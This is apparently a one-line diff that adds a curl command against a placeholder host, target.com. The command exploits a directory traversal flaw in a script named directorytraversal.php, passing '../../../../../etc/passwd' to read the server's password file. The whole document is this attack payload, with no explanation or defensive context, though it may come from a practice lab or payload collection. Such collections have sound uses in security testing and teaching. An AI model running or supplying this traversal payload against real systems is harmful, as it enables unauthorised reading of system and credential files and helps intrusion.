@@ -1,0 +1,1 @@
+curl http://target.com/directorytraversal/directorytraversal.php?ascii=../../../../../etc/passwd
